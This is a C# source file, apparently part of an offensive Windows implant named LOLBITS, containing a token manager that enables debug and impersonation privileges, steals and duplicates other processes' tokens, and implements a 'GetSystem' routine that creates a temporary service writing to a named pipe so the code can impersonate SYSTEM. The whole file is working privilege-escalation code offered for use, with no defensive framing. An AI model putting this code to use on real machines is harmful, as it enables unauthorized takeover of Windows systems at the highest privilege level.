using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO.Pipes;
using System.Runtime.InteropServices;
using System.Threading;

namespace LOLBITS.TokenManagement
{
    public class TokenManager
    {
        public static IntPtr Token; 
        public static int Method; // 1 = CreateProcessAsUser ; 2 = CreateProcessWithToken ; 3 = RunAs with valid credentials
        public static readonly string[] Credentials = new string[3]; // [1] = Username ; [2] = Domain ('.' for local domain) ; [3] = Password 
        private static string _pipeName;
        private const int NumThreads = 1;
        private readonly SysCallManager sysCall;

        public TokenManager(SysCallManager sysCall)
        {
            Token = IntPtr.Zero;
            Method = 0;
            this.sysCall = sysCall;
        }

        public static void Rev2Self()
        {
            Token = IntPtr.Zero;
            Method = 0;
        }

        /////////////////////////// Impersonation ///////////////////////////

        public bool Impersonate (int pid)
        {
            var privileges = new List<string>
            {
                "SeDebugPrivilege",
                "SeImpersonatePrivilege",
                "SeTcbPrivilege",
                "SeAssignPrimaryTokenPrivilege",
                "SeIncreaseQuotaPrivilege"
            };
            
            try
            {
                Utils.GetProcessToken(Process.GetCurrentProcess().Handle, Utils.TokenAccessFlags.TokenAdjustPrivileges,
                    out var token, sysCall);

                Utils.EnablePrivileges(token, privileges);

                Utils.GetProcessHandle(pid, out var handlePointer, Utils.ProcessAccessFlags.QueryInformation, sysCall);

                Utils.GetProcessToken(handlePointer, Utils.TokenAccessFlags.TokenDuplicate, out var tokenPointer,
                    sysCall);

                Utils.CloseHandle(handlePointer);

                if (tokenPointer == IntPtr.Zero) return false;

                var tokenAccess =
                    Utils.TokenAccessFlags.TokenQuery | Utils.TokenAccessFlags.TokenAssignPrimary |
                    Utils.TokenAccessFlags.TokenDuplicate | Utils.TokenAccessFlags.TokenAdjustDefault |
                    Utils.TokenAccessFlags.TokenAdjustSessionId;

                Utils.DuplicateToken(tokenPointer, tokenAccess, Utils.SecurityImpersonationLevel.SecurityImpersonation,
                    Utils.TokenType.TokenPrimary, out var impToken);

                if (impToken == IntPtr.Zero) return false;


                var startupInfo = new Utils.StartupInfo();
                startupInfo.cb = Marshal.SizeOf(startupInfo);
                startupInfo.lpDesktop = "";
                startupInfo.wShowWindow = 0;
                startupInfo.dwFlags |= 0x00000001;

                var processInfo = new Utils.ProcessInformation();

                if (Method == 0)
                {
                    try
                    {
                        Utils.DetermineImpersonationMethod(impToken, new Utils.LogonFlags(), startupInfo, out processInfo);
                    }
                    catch
                    {
                        return false;                        
                    }
                }

                if (Method != 0)
                {
                    Token = impToken;
                    return true;
                }
            }
            catch
            {

            }

            return false;
        }

        public bool GetSystem()
        {


            int pid = Utils.getSystemPID();

            if (Impersonate(pid))
                return true;

            _pipeName = Jobs.RandomString(7);
            var exit = false;
            var server = new Thread(ServerThread);

            var cmd = "sc create NewDefaultService2 binpath= \"c:\\windows\\system32\\cmd.exe /C echo data > \\\\.\\pipe\\" + _pipeName + "\"";
            Utils.ExecuteCommand(cmd);

            server.Start();
            Thread.Sleep(250);

            cmd = "sc start NewDefaultService2";
            Utils.ExecuteCommand(cmd);

            while (!exit)
            {
                if (server.Join(250))
                    exit = true;
            }

            if (Token != IntPtr.Zero)
                return true;

            cmd = "sc delete NewDefaultService2";
            Utils.ExecuteCommand(cmd);

            return false;
        }

        public static bool RunAs(string domain, string user, string password)
        {
            Utils.RunAs(domain, user, password);

            return Method == 3;
        }

        private static void ServerThread(object data)
        {
            var pipeServer = new NamedPipeServerStream(_pipeName, PipeDirection.InOut, NumThreads);
            var threadId = Thread.CurrentThread.ManagedThreadId;

            // Wait for a client to connect
            pipeServer.WaitForConnection();

            try
            {
                // Read the request from the client. Once the client has
                // written to the pipe its security token will be available.

                var ss = new StreamString(pipeServer);

                var filename = ss.ReadString();
                var fileReader = new Utils();

                pipeServer.RunAsClient(Utils.Start);

                // Catch the IOException that is raised if the pipe is broken
                // or disconnected.
            }
            catch
            {

            }
            finally
            {
                pipeServer.Close();
            }
        }

    }
}
